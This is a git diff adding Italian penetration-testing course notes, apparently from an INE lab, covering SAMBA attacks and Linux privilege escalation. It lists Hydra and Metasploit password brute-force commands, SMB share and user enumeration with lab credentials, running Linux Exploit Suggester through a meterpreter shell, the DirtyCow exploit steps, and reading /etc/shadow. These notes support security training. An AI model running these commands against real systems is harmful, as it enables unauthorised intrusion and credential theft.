@@ -933,3 +933,140 @@ uname -r //per mostrare la versione del kernel
 ```
 
 ### Exploiting SAMBA
+
+#### Bruteforce sull'istanza SAMBA con Hydra
+
+```
+hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.56.47.3 smb
+```
+
+#### Bruteforce con MSF: modulo smb\_login <a href="#alternativa-con-msf-modulo-smb_login" id="alternativa-con-msf-modulo-smb_login"></a>
+
+```
+use auxiliary/scanner/smb/smb_login
+show options
+//configurare le opzioni
+```
+
+#### smbmap: Samba Share Enumerator <a href="#smbmap-samba-share-enumerator" id="smbmap-samba-share-enumerator"></a>
+
+```
+smbmap
+smbmap -H 192.56.47.3 -u admin -p password1
+```
+
+#### smbclient: Accedere alle share samba
+
+```
+smbclient
+man smbclient
+smbclient -L 192.56.47.3 -U admin //e ci chiederà la password
+smbclient //192.56.47.3/shawn -U admin
+?
+exit
+smbclient //192.56.47.3/admin -U admin
+cd hidden
+dir
+get flag.tar.gz
+exit
+tar xzf flag.tar.gz
+ls
+cat flag
+```
+
+#### enum4linux per enumerare le informazioni su SAMBA
+
+```
+enum4linux -a 192.56.47.3
+enum4linux
+enum4linux -a -u admin -p password1 192.56.47.3
+```
+
+Controlla le info che trova sul target e se è presente SAMBA ce lo mostra e prova a verificare se è possibile loggarsi a SAMBA tramite sessioni null, che in questo caso non sono consentite. In tal caso ci mostrebbe altre info.
+
+Con -a ci fornisce informazioni sul sistema operativo, sugli utenti di samba e le share. Tenta poi di mappare le share, password policy information, ed infine ottiene gli SIDs per tutti gli account.
+
+#### Elencare gli SID degli utenti unix scoperti con utente admin
+
+List sid of Unix users shawn, jane, nancy and admin respectively by performing RID cycling using enum4Linux with credentials obtained in question 2.
+
+```
+enum4linux -r -u "admin" -p "password1" demo.ine.local
+```
+
+#### Elencare le named pipes disponibili via SAMBA
+
+List the named pipes available over SMB on the samba server? Use pipe\_auditor metasploit module with credentials obtained from question 2.
+
+Answer: netlogon, lsarpc, samr, eventlog, InitShutdown, ntsvcs, srvsvc, wkssvc
+
+```
+msfconsole -q
+use auxiliary/scanner/smb/pipe_auditor
+set SMBUser admin
+set SMBPass password1
+set RHOSTS demo.ine.local
+exploit
+```
+
+## Linux Privilege Escalation
+
+### Linux Kernel Exploits
+
+<figure><img src="../.gitbook/assets/image (985).png" alt=""><figcaption></figcaption></figure>
+
+{% hint style="info" %}
+ATTENZIONE: Kernel Exploits non compatibili con la versione di kernel del target può comportare server crash, kernel panic e conseguente perdita di dati. Fare quindi molta attenzione ad eseguire Kernel exploits in ambienti di produzione o enterprise.
+{% endhint %}
+
+#### Local enumeration <a href="#local-enumeration" id="local-enumeration"></a>
+
+Nel nostro laboratorio partiamo dalla situazione in cui abbiamo già ottenuto accesso al target tramite degli exploit e quindi facciamo come prima cosa un po' di local enumeration:sysinfogetuid​.
+
+Come vediamo l'utente www-data non ha nessun permesso sudo per cui dobbiamo fare privilege escalation e puntiamo ovviamente a farla verso l'utente root.
+
+#### Privesc con Linux Exploit Suggester tool <a href="#privesc-con-linux-exploit-suggester-tool" id="privesc-con-linux-exploit-suggester-tool"></a>
+
+è uno shell script molto semplice da usare.
+
+è suggerito scaricare LES sulla macchina attaccante e poi trasferirlo sulla vittima per eseguirlo.
+
+In questo caso abbiamo una meterpreter shell quindi sarà più semplice:
+
+```
+cd /temp
+ls
+upload Desktop/Linux-Enum/les.sh
+shell
+ls -al
+chmod +x les.sh
+ls -alps
+./les.sh
+```
+
+Eseguendo LES ci verranno mostrate una serie di exploits per i quali la nostra specifica versione del kernel è vulnerabile.
+
+In particolare il pezzo più importante per fare kernel exploitation è contenuto nelle prima righe del risultato: Kernel version, Architecture, Distribution, Distribution version.
+
+Gli exploit elencati all'inizio sono quelli con maggior probabilità di successo, tuttavia bisogn afare attenzione alla descrizione di ogni exploit per verificarne l'effettiva compatibilità, in particolare details, exposure e tags.
+
+Verifichiamo il primo exploit che capita su exploit-db, ad es. _dirtycow_.
+
+Le azioni da fare elencate nel commento del codice dell'exploit dirtycow sono:
+
+* Compilare
+* Eseguire il binary appena creato
+
+#### Eseguire l'exploit (es. dirtycow)
+
+1. Scarichiamo il programma scritto in C da Exploit Database
+2. Carichiamo il codice C sulla macchina vittima
+3. Compiliamo il codice C sulla macchina vittima
+4. Eseguiamo il binario compilato, ossia l'exploit
+
+Nel caso specifico di dirtycow è creato un nuovo utente a cui è possibile connettersi poi in SSH.
+
+Per verificare se siamo utenti privilegiati proviamo a fare cat del file /etc/shadow.
+
+### Exploiting Misconfigured Cron Jobs
+
